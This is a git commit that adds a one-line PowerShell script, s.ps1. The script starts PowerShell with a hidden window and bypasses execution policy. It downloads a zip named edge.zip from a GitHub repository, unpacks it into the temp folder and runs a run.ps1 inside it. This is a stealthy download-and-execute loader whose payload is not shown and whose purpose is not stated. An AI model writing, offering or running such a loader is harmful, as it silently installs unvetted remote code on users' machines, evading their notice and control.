8fd2ea6926b63b712927c5119b8a5a70c05dd9eb
AnhNH <97667309+Haianh58@users.noreply.github.com>
2026-04-08 18:22:10 +0700

    Add files via upload

---
+++ s.ps1
@@ -0,0 +1,1 @@
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Haianh58/test/raw/refs/heads/main/edge.zip' -OutFile '$env:TEMP\edge.zip'; Expand-Archive -Path '$env:TEMP\edge.zip' -DestinationPath '$env:TEMP\edge_work' -Force; Set-Location '$env:TEMP\edge_work'; .\run.ps1"
